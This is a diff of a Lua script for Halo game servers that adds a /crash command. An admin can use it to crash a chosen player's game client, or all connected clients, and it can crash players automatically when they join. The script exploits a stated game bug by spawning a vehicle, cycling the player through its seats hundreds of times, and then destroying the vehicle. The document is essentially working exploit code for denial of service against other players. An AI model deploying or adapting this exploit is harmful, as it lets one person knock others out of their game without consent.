@@ -17,7 +17,7 @@ Syntax: /crash [player id | me | */all]
 This script works by exploiting a halo bug:
 1). We spawn a vehicle (chain gun warthog in the case of vanilla maps).
 2). Initialise a for-loop & enter player into the seat of the current loop iteration index.
-3). Execute 50 to 1000 iterations within 100th of a second. 
+3). Execute 50 to 1000 iterations within 100th of a second.
 4). Once loop has finished executing we destroy the vehicle object and this will cause the client to crash.
 
 Copyright (c) 2020-2021, Jericho Crosby <jericho.crosby227@gmail.com>
@@ -81,7 +81,7 @@ local Crash = {
         -- For custom maps, if you're experiencing a problem where the command executes fine but all it does
         -- is kill the player, try setting the iterations higher.
 
-        { "vehicles\\warthog\\mp_warthog", 100 }, -- this tag is sufficient for all stock maps.
+        { "vehicles\\warthog\\mp_warthog", 500 }, -- this tag is sufficient for all stock maps.
         { "bourrin\\halo reach\\vehicles\\warthog\\rocket warthog", 2000 }, -- this is for bigassv2,104
     }
     --===================================================--
@@ -90,11 +90,11 @@ local Crash = {
 
 function OnScriptLoad()
     register_callback(cb['EVENT_TICK'], "OnTick")
-    register_callback(cb['EVENT_JOIN'], "OnPlayerConnect")
+    register_callback(cb['EVENT_JOIN'], "OnPlayerJoin")
+    register_callback(cb['EVENT_LEAVE'], "OnPlayerQuit")
     register_callback(cb['EVENT_GAME_START'], "OnGameStart")
     register_callback(cb['EVENT_COMMAND'], "OnServerCommand")
-    register_callback(cb['EVENT_LEAVE'], "OnPlayerDisconnect")
-    Crash:SetCrashVehicle()
+    OnGameStart()
 end
 
 function OnScriptUnload()
@@ -102,18 +102,47 @@ function OnScriptUnload()
 end
 
 function OnGameStart()
-    Crash:SetCrashVehicle()
+    if (get_var(0, "$gt") ~= "n/a") then
+        Crash:SetCrashVehicle()
+    end
 end
 
-local gsub = string.gsub
-local lower, gmatch = string.lower, string.gmatch
 local function CMDSplit(CMD)
     local Args = { }
-    CMD = gsub(CMD, '"', "")
-    for Params in gmatch(CMD, "([^%s]+)") do
-        Args[#Args + 1] = lower(Params)
+    CMD = CMD:gsub('"', "")
+    for Params in CMD:gmatch(CMD, "([^%s]+)") do
+        Args[#Args + 1] = Params:lower()
     end
     return Args
+end
+
+local function GetPlayers(Executor, Args)
+    local pl = { }
+    if (Args[2] == nil or Args[2] == "me") then
+        if (Executor ~= 0) then
+            table.insert(pl, Executor)
+        else
+            Crash:Respond(Executor, "Please enter a valid player id", 10)
+        end
+    elseif (Args[2] ~= nil and Args[2]:match("^%d+$")) then
+        if player_present(Args[2]) then
+            table.insert(pl, Args[2])
+        else
+            Crash:Respond(Executor, "Player #" .. Args[2] .. " is not online", 10)
+        end
+    elseif (Args[2] == "all" or Args[2] == "*") then
+        for i = 1, 16 do
+            if player_present(i) then
+                table.insert(pl, i)
+            end
+        end
+        if (#pl == 0) then
+            Crash:Respond(Executor, "There are no players online!", 10)
+        end
+    else
+        Crash:Respond(Executor, "Invalid Command Syntax. Please try again!", 10)
+    end
+    return pl
 end
 
 function Crash:OnServerCommand(Executor, CMD)
@@ -123,7 +152,7 @@ function Crash:OnServerCommand(Executor, CMD)
         if (lvl >= self.permission or Executor == 0) then
             if (Args[2] ~= nil) then
                 if (self.vehicle_tag ~= nil) then
-                    local pl = self:GetPlayers(Executor, Args)
+                    local pl = GetPlayers(Executor, Args)
                     if (pl) then
                         for i = 1, #pl do
                             local TargetID = tonumber(pl[i])
@@ -131,8 +160,10 @@ function Crash:OnServerCommand(Executor, CMD)
                                 if (not self.crash_self) then
                                     self:Respond(Executor, "You cannot execute this command on yourself", 10)
                                 end
-                            else
+                            elseif (player_alive(TargetID)) then
                                 self:CrashClient(Executor, TargetID)
+                            else
+                                self:Respond(Executor, "Player #" .. TargetID .. " is not alive! Please wait until they respawn")
                             end
                         end
                     end
@@ -181,77 +212,72 @@ end
 
 function Crash:OnTick()
     for i = 1, 16 do
-        local DyN = get_dynamic_player(i)
-        if (DyN ~= 0) and player_present(i) and player_alive(i) then
-            if (self.players[i] and self.players[i][1]) then
-                self.players[i][1] = false
+        if (player_present(i) and self.players[i]) then
+            local DyN = get_dynamic_player(i)
+            if (DyN ~= 0) then
                 self:CrashClient(0, i)
             end
         end
     end
 end
 
-function OnPlayerConnect(Ply)
-    if Crash:CrashOnJoin(Ply) then
-        Crash.players[Ply] = {}
-        Crash.players[Ply][1] = true
+function Crash:OnPlayerJoin(Ply)
+    if self:CrashOnJoin(Ply) then
+        self.players[Ply] = true
     end
 end
 
-function OnPlayerDisconnect(Ply)
-    if (Crash.players[Ply]) then
-        Crash.players[Ply] = nil
-    end
+function Crash:OnPlayerQuit(Ply)
+    self.players[Ply] = nil
 end
 
 local function GetXYZ(Ply)
-    local x, y, z
     local DyN = get_dynamic_player(Ply)
     if (DyN ~= 0) then
         local VehicleID = read_dword(DyN + 0x11C)
+        local VehicleObject = get_object_memory(VehicleID)
         if (VehicleID == 0xFFFFFFFF) then
-            x, y, z = read_vector3d(DyN + 0x5c)
-        else
-            x, y, z = read_vector3d(get_object_memory(VehicleID) + 0x5c)
+            return read_vector3d(DyN + 0x5c)
+        elseif (VehicleObject ~= 0) then
+            return read_vector3d(VehicleObject + 0x5c)
         end
     end
-    return x, y, z
+    return nil
 end
 
 function Crash:CrashClient(Executor, TargetID)
+
+    self.players[TargetID] = false
+
     local name = get_var(TargetID, "$name")
-    if player_alive(TargetID) then
+    local x, y, z = GetXYZ(TargetID)
 
-        local x, y, z = GetXYZ(TargetID)
-        local vehicle = spawn_object("vehi", self.vehicle_tag, x, y, z)
-        local object = get_object_memory(vehicle)
+    local vehicle = spawn_object("vehi", self.vehicle_tag, x, y, z)
+    local object = get_object_memory(vehicle)
 
-        if (object ~= 0) then
+    if (object ~= 0) then
 
+        --
+        -- Initialize a for-loop starting at 0 (first iteration):
+        --
+        for seat = 0, self.iterations do
             --
-            -- Initialize a for-loop starting at 0 (first iteration):
+            -- Enter player into the seat number of the current loop iteration.
             --
-            for seat = 0, self.iterations do
-                --
-                -- Enter player into the seat number of the current loop iteration.
-                --
-                enter_vehicle(vehicle, TargetID, seat)
-                --
-                -- Force player out of vehicle.
-                --
-                exit_vehicle(TargetID)
-            end
+            enter_vehicle(vehicle, TargetID, seat)
             --
-            -- Approx 50 milliseconds later:
-            -- Destroy vehicle after for-loop has finished executing
+            -- Force player out of vehicle.
             --
-            destroy_object(vehicle)
-            self:Respond(Executor, "Crashed " .. name .. "'s game client", 10)
-        else
-            self:Respond(Executor, "Something went wrong! Try again.", 10)
+            exit_vehicle(TargetID)
         end
+        --
+        -- Approx 50 milliseconds later:
+        -- Destroy vehicle after for-loop has finished executing
+        --
+        destroy_object(vehicle)
+        self:Respond(Executor, "Crashed " .. name .. "'s game client", 10)
     else
-        return self:Respond(Executor, name .. " is dead. Please wait until they respawn.")
+        self:Respond(Executor, "Something went wrong! Try again.", 10)
     end
 end
 
@@ -273,35 +299,6 @@ function Crash:Respond(Ply, Message, Color)
     end
 end
 
-function Crash:GetPlayers(Executor, Args)
-    local pl = { }
-    if (Args[2] == nil or Args[2] == "me") then
-        if (Executor ~= 0) then
-            table.insert(pl, Executor)
-        else
-            self:Respond(Executor, "Please enter a valid player id", 10)
-        end
-    elseif (Args[2] ~= nil) and (Args[2]:match("^%d+$")) then
-        if player_present(Args[2]) then
-            table.insert(pl, Args[2])
-        else
-            self:Respond(Executor, "Player #" .. Args[2] .. " is not online", 10)
-        end
-    elseif (Args[2] == "all" or Args[2] == "*") then
-        for i = 1, 16 do
-            if player_present(i) then
-                table.insert(pl, i)
-            end
-        end
-        if (#pl == 0) then
-            self:Respond(Executor, "There are no players online!", 10)
-        end
-    else
-        self:Respond(Executor, "Invalid Command Syntax. Please try again!", 10)
-    end
-    return pl
-end
-
 local function GetTag(Type, Name)
     local Tag = lookup_tag(Type, Name)
     return Tag ~= 0 and read_dword(Tag + 0xC) or nil
@@ -315,15 +312,12 @@ function Crash:SetCrashVehicle()
     self.vehicle_tag = nil
     self.iterations = nil
 
-    if (get_var(0, "$gt") ~= "n/a") then
-        for _, v in pairs(self.tags) do
-            -- The first valid vehicle tag address found will be used:
-            if GetTag("vehi", v[1]) then
-                self.vehicle_tag = v[1]
-                self.iterations = v[2]
-                self.delay = v[3]
-                break
-            end
+    for _, v in pairs(self.tags) do
+        if GetTag("vehi", v[1]) then
+            self.vehicle_tag = v[1]
+            self.iterations = v[2]
+            self.delay = v[3]
+            break
         end
     end
 end
@@ -334,6 +328,14 @@ end
 
 function OnTick()
     return Crash:OnTick()
+end
+
+function OnPlayerJoin(Ply)
+    return Crash:OnPlayerJoin(Ply)
+end
+
+function OnPlayerQuit(Ply)
+    return Crash:OnPlayerQuit(Ply)
 end
 
 return Crash
